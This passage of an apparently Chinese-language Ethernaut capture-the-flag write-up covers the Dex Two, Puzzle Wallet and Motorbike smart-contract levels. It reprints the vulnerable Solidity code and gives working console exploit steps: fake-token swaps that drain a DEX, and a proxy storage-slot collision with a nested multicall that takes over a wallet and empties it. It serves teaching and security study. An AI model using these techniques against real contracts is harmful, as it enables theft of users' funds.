&#x2F;&#x2F; 因为合约 DexTwo 拥有 token 100 个，拥有 AttackToken1 1 个，二者相差100倍</span><br><span class="line">        &#x2F;&#x2F; 我们就可以获取 1 * 100 &#x3D; 100 个token1了</span><br><span class="line">        _mint(_player, 1);</span><br><span class="line">        _mint(_instance, 1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AttackToken2 is ERC20 &#123;</span><br><span class="line">    constructor(address _player, address _instance) ERC20(&#39;AttackToken2&#39;, &#39;T2&#39;)&#123;</span><br><span class="line">       &#x2F;&#x2F; 同上</span><br><span class="line">       _mint(_player, 1);</span><br><span class="line">        _mint(_instance, 1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从控制台获取<code>player</code>和<code>instance</code>地址后，部署上面两个合约，然后进行授权：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.approve(instance, 500)</span><br><span class="line">Attacktoken1.approve(instance_addr, 500)</span><br><span class="line">Attacktoken2.approve(instance_addr, 500)</span><br></pre></td></tr></table></figure><p>然后就是调用<code>swap</code>函数了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.swap(attacktoken1_addr,token1_addr, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(attacktoken2_addr,token2_addr, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;..&#x2F;helpers&#x2F;UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;</span><br><span class="line">        admin &#x3D; _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      require(msg.sender &#x3D;&#x3D; admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin &#x3D; _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin &#x3D;&#x3D; _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin &#x3D; pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address &#x3D;&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance &#x3D;&#x3D; 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance &#x3D; _maxBalance;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &#x3D;&#x3D; 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance &#x3D; _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;&#x3D; maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;&#x3D; value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -&#x3D; value;</span><br><span class="line">        (bool success, ) &#x3D; to.call&#123; value: value &#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled &#x3D; false;</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data &#x3D; data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector :&#x3D; mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector &#x3D;&#x3D; this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                &#x2F;&#x2F; Protect against reusing msg.value</span><br><span class="line">                depositCalled &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) &#x3D; address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>通关条件：</strong>劫持钱包，成为代理的管理员</p><blockquote><p>本关卡参考自<a href="https://xz.aliyun.com/t/11159#toc-15" target="_blank" rel="noopener">【https://xz.aliyun.com/t/11159#toc-15】</a></p></blockquote><p>本关卡涉及代理，我们先来说一下代理模式，这是一种常见的设计模式，提供通过代理的方式访问真正的实例，生活中经理和秘书的关系实际上就是一种代理模式，我们要和经理打交道，先通过和秘书预约，秘书会转发消息到经理，经理的决策反馈到秘书，最终秘书会告知我们结果。</p><p>在程序设计中，如果我们要访问模块A，我们可以通过访问代理B，在代理B中，有模块A的对象实例，并且二者的接口几乎一致，使得我们调用B的时候，我们以为我们在调用A。</p><p>代理模式优点是：实现热部署，即如果我们业务逻辑要更新，我们只要在代理中切换实例对象即可，使用者并不知道服务有中断。</p><p>在智能合约中，该模式还有利于解决区块链中“<strong>一旦上链，就无法更新代码</strong>”的问题，我们可以部署一个代理合约，然后给管理员暴露一个切换真实实例的接口（函数），然后将<strong>转发功能</strong>在<code>fallback</code>函数中执行。</p><p>获取本道题的实例后，得到一个地址，<code>0xb042791D96306B9A1e7dD3B8f3e7734af2B37C8f</code>,然后在控制台输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.methods</span><br></pre></td></tr></table></figure><p>我们可以看到，都是<code>PuzzleWallet</code>中的函数，可是实际上这个地址真的是合约<code>PuzzleWallet</code>的实例地址吗？实际上并不是，我们在<code>Ethernaut</code>的github项目中找到<a href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/PuzzleWalletFactory.sol" target="_blank" rel="noopener">【工厂合约】</a>，在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#39;.&#x2F;base&#x2F;Level.sol&#39;;</span><br><span class="line">import &#39;.&#x2F;PuzzleWallet.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract PuzzleWalletFactory is Level &#123;</span><br><span class="line"></span><br><span class="line">  function createInstance(address &#x2F;*_player*&#x2F;) override public payable returns (address) &#123;</span><br><span class="line">    require(msg.value &#x3D;&#x3D;  0.001 ether, &quot;Must send 0.001 ETH to create instance&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; deploy the PuzzleWallet logic</span><br><span class="line">    PuzzleWallet walletLogic &#x3D; new PuzzleWallet();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; deploy proxy and initialize implementation contract</span><br><span class="line">    bytes memory data &#x3D; abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);</span><br><span class="line">    PuzzleProxy proxy &#x3D; new PuzzleProxy(address(this), address(walletLogic), data);</span><br><span class="line">    PuzzleWallet instance &#x3D; PuzzleWallet(address(proxy));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; whitelist this contract to allow it to deposit ETH</span><br><span class="line">    instance.addToWhitelist(address(this));</span><br><span class="line">    instance.deposit&#123; value: msg.value &#125;();</span><br><span class="line"></span><br><span class="line">    return address(proxy);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function validateInstance(address payable _instance, address _player) override public view returns (bool) &#123;</span><br><span class="line">    PuzzleProxy proxy &#x3D; PuzzleProxy(_instance);</span><br><span class="line"></span><br><span class="line">    return proxy.admin() &#x3D;&#x3D; _player;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，先是创建一个<code>PuzzleWallet</code>合约，然后创建<code>PuzzleProxy</code>并最后返回<code>proxy</code>地址。</p><p>那为什么从<code>abi</code>层面来看，又是<code>PuzzleWallet</code>呢？其实这就是代理模式，我们实际上暴露的就是实际合约的接口，用户面向的是代理。</p><p>通过查看<code>UpgradeableProxy</code>的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Proxy.sol" target="_blank" rel="noopener">【源码1】</a>和<a href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/helpers/UpgradeableProxy-08.sol" target="_blank" rel="noopener">【源码2】</a>，我们可以发现，其在<code>fallback</code>函数中使用了<code>delegatecall</code>，该调用方式类似于库函数调用，借用远方地址的代码，修改本地的数据，但是该方式需要远方地址和本地地址有相同的存储槽相同，否则极易发生错误。</p><p>回到本关卡，为了达到将代理合约的管理员修改为我们自己，我们需要调用<code>approveNewAdmin()</code>函数，然后该函数只有管理者本身才可以调用，那我们该如何下手？我们仔细一想，我们能不能使用<code>delegatecall</code>来干点事，我们先看一下<code>PuzzleProxy</code>的存储：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------</span><br><span class="line">|unused (12)| pendingAdmin (20) | &lt;- slot 0</span><br><span class="line">---------------------------------</span><br><span class="line">|unused (12)|      admin (20)   | &lt;- slot 1</span><br><span class="line">---------------------------------</span><br></pre></td></tr></table></figure><p>再看一下<code>PuzzleWallet</code>的存储：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------</span><br><span class="line">|unused (12)|      owner (20)   | &lt;- slot 0</span><br><span class="line">---------------------------------</span><br><span class="line">|         maxBalance (32)       | &lt;- slot 1</span><br><span class="line">---------------------------------</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>实际上二者并不相同</strong>，如果我们尝试使用<code>delegatecall</code>的方式修改变量<code>maxBalance</code>的同时，也会修改<code>admin</code>。<strong>这是突破口</strong>。</p><p>我们再来看看，如何能够修改<code>maxBalance</code>，支持修改改变量的函数只有两个，一个是<code>init</code>和<code>setMaxBalance</code>，前者是只能在创建合约时候调用，后者是需要我们在白名单内，我们再看看如何把我们加入到白名单中，加入白名单需要调用<code>addToWhitelist</code>，而该函数又被限制了只能是<code>PuzzleWallet</code>的所有者（<code>owner</code>）才能访问，那我们看看能不能成为该所有者，很遗憾，<code>PuzzleWallet</code>中没有函数可以做到修改所有者，但是实际上我们还可以继续通过<code>delegatecall</code>进行。</p><p>由于<code>pendingAdmin</code>和<code>owner</code>是处于同一<code>slot</code>，即我们通过调用<code>PuzzleProxy.proposeNewAdmin</code>，即可完成对<code>owner</code>的修改。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">web3.utils.keccak256(<span class="string">"proposeNewAdmin(address)"</span>)</span><br><span class="line"><span class="string">'0xa6376746fd40c5ce12d104971ce46bc4c5b160393fb8e6810412fb23e06a0770'</span></span><br><span class="line"><span class="comment">// 取前 4 个字节</span></span><br><span class="line">selector = <span class="string">'0xa6376746'</span></span><br><span class="line"><span class="comment">// 将我们的地址补全到 32 个字节</span></span><br><span class="line">param = <span class="string">'000000000000000000000000'</span> + player.slice(<span class="number">2</span>,)</span><br><span class="line">param.length == <span class="number">64</span></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>:selector + param&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.owner() == player</span><br></pre></td></tr></table></figure><p>完成上面以后，我们即可获取<code>PuzzleWallet</code>的所有权。</p><p>然后将我们加入到白名单中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.addToWhitelist(player)</span><br></pre></td></tr></table></figure><p><code>setMaxBalance</code>函数还有一个要求，即合约拥有的以太币要为零。通过查询，<code>await getBalance(instance)</code>，我们发现，其内有0.001的以太币，如果我们想要通过<code>execute</code>函数转走合约中的余额，就要求<code>balances</code>中记录我们的余额不为零且大于要转走的数目，而现在该值为零，想要它不为零，则要先转入以太币，这样又造成了其余额增多，因此该方法不可取。</p><p>换句话说，如果我们如果能够通过某种方式使得<code>balances[player]&gt;player转给合约的以太币</code>，那么我们最后就可以通过<code>execute</code>将合约中的以太币都转走。</p><p>再仔细看看，我们发现<code>PuzzleWallet</code>中还有一个函数<code>multicall</code>，该函数是用于实现一次性完成多次交易的，我们还注意到，其函数内有一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (selector &#x3D;&#x3D; this.deposit.selector) &#123;</span><br><span class="line">	require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">    &#x2F;&#x2F; Protect against reusing msg.value</span><br><span class="line">    depositCalled &#x3D; true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，在一次调用<code>multicall</code>中，最多只能对<code>deposit</code>调用一次，看上去心思缜密，但是实际上只是通过<code>selector</code>来进行判断，而这一步骤是可以绕过的，即第一次我们调用<code>deposit()</code>，第二次通过其本身调用<code>multicall(deposit())</code>，然后我们就可以使用0.001以太币的代价使得<code>balances[player]</code><strong>修改两次</strong>（因为<code>selector == this.deposit.selector</code>被我们绕过了，<code>multicall(deposit())</code>是通过<code>delegatecall</code>的方式调用，该方式调用时候<code>msg</code>不会改变）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取deposit()函数的签名</span></span><br><span class="line">depositData = <span class="keyword">await</span> contract.methods[<span class="string">"deposit()"</span>].request().then(<span class="function"><span class="params">v</span> =&gt;</span> v.data)</span><br><span class="line"><span class="comment">// 获取multicall(deposit())的签名</span></span><br><span class="line">multicallData = <span class="keyword">await</span> contract.methods[<span class="string">"multicall(bytes[])"</span>].request([depositData]).then(<span class="function"><span class="params">v</span> =&gt;</span> v.data)</span><br><span class="line"><span class="comment">// 通过一次调用multicall，实现两次调用deposit</span></span><br><span class="line"><span class="keyword">await</span> contract.multicall([depositData, multicallData], &#123;<span class="attr">value</span>: toWei(<span class="string">'0.001'</span>)&#125;)</span><br><span class="line"><span class="comment">// 确保合约记录我们的余额与合约拥有的代币数量相同</span></span><br><span class="line">fromWei(<span class="keyword">await</span> contract.balances(player)) == <span class="keyword">await</span> getBalance(instance)</span><br></pre></td></tr></table></figure><blockquote><p>这里查询我们的“余额”使用<code>contract.balances()</code>是因为我们想要看看合约中记录的我们的余额是多少，即在合约看来，我们有多少钱，后者使用<code>getBalance</code>是查询合约拥有的以太币。</p></blockquote><p>下一步就是要清空合约中的以太币了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.execute(player, toWei(<span class="string">'0.002'</span>), <span class="number">0x0</span>)</span><br><span class="line"><span class="keyword">await</span> getBalance(instance) == <span class="number">0</span></span><br></pre></td></tr></table></figure><p>下一步，就是通过设置设置<code>maxBalance</code>来修改<code>admin</code>了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">player</span><br><span class="line">_maxBalance = <span class="string">'0x000000000000000000000000'</span> + player.slice(<span class="number">2</span>,)</span><br><span class="line">_maxBalance.length == <span class="number">66</span></span><br><span class="line"><span class="keyword">await</span> contract.setMaxBalance(_maxBalance)</span><br></pre></td></tr></table></figure><p><strong>我只能说这道题，完全碾压我😭</strong></p><h2 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06&#x2F;utils&#x2F;Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-06&#x2F;proxy&#x2F;Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    &#x2F;&#x2F; keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT &#x3D; 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    </span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; Initializes the upgradeable proxy with an initial implementation specified by &#96;_logic&#96;.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value &#x3D; _logic;</span><br><span class="line">        (bool success,) &#x3D; _logic.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;initialize()&quot;)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Delegates the current call to &#96;implementation&#96;.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        &#x2F;&#x2F; solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result :&#x3D; delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Fallback function that delegates calls to the address returned by &#96;_implementation()&#96;. </span><br><span class="line">    &#x2F;&#x2F; Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback () external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Returns an &#96;AddressSlot&#96; with member &#96;value&#96; located at &#96;slot&#96;.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot :&#x3D; slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    &#x2F;&#x2F; keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT &#x3D; 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower &#x3D; 1000;</span><br><span class="line">        upgrader &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Upgrade the implementation of the proxy to &#96;newImplementation&#96;</span><br><span class="line">    &#x2F;&#x2F; subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; upgrader, &quot;Can&#39;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(</span><br><span class="line">        address newImplementation,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        &#x2F;&#x2F; Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) &#x3D; newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        </span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot :&#x3D; _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value &#x3D; newImplementation;</span><br><span class="line">    &#125;</span><br><span 